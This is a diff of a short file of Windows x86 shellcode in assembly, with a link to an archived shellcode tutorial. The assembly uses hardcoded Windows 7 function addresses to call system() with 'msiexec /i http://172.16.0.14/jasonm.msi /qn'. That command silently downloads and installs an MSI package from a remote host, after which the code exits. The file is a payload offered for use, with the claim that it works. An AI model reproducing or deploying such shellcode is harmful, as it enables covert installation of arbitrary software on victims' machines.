@@ -1,10 +1,13 @@
 https://web.archive.org/web/20120503030935/http://projectshellcode.com/?q=node/12
-follow above tutorials to output shellcode or follow dudes write-up....I'm sure it works!
+
+# Follow above tutorials to output shellcode or follow dudes write-up....I'm sure it works!
 
 
-Following asm does this;
+# The following asm does this:
 
-#msiexec /i http://172.16.0.14/jasonm.msi /qn
+# msiexec /i http://172.16.0.14/jasonm.msi /qn
+
+# Need to Determine LoadLibrary, ExitProcess & System via Arwin
 
 
 ------------assembly starts---------------
@@ -16,33 +19,53 @@ global _start
 
 
 _start:
-
-			 ;determine LoadLibrary, ExitProcess & System via Arwin, or follow write-up
+			
 mov ebx, 0x777fde35      ;Address of function LoadLibraryA (win7)
+
 call ebx
+
 mov ebp, eax             ;msvcrt.dll is saved in ebp
 
 xor eax, eax
+
 PUSH eax
+
 PUSH 0x6e712f20
+
 PUSH 0x69736d2e
+
 PUSH 0x6d6e6f73
+
 PUSH 0x616a2f34
+
 PUSH 0x312e302e
+
 PUSH 0x36312e32
+
 PUSH 0x37312f2f
+
 PUSH 0x3a707474
+
 PUSH 0x6820692f
+
 PUSH 0x20636578
+
 PUSH 0x6569736d
+
 MOV EDI,ESP
+
 PUSH EDI
+
 MOV EAX, 0x768db177		;calling the system()
+
 CALL EAX
+
 xor eax, eax
 
 push eax
+
 mov eax, 0x7780be5a     ; ExitProcess
+
 call eax
 
 --------------assembly end----------------------------------
